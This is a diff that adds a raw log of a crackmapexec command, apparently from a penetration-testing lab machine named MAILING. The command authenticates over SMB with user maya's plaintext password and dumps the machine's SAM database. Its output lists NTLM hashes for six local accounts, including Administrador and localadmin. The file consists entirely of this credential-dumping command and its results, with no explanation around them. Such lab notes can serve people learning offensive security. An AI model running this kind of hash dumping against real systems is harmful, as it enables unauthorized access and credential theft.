@@ -1,0 +1,12 @@
+
+command : crackmapexec smb 10.129.231.40 -u maya -p m4y4ngs4ri --sam
+SMB         10.129.231.40   445    MAILING          [*] Windows 10.0 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.129.231.40   445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
+SMB         10.129.231.40   445    MAILING          [*] Dumping SAM hashes
+SMB         10.129.231.40   445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.231.40   445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.231.40   445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.231.40   445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
+SMB         10.129.231.40   445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
+SMB         10.129.231.40   445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
+SMB         10.129.231.40   445    MAILING          [+] Added 6 SAM hashes to the database
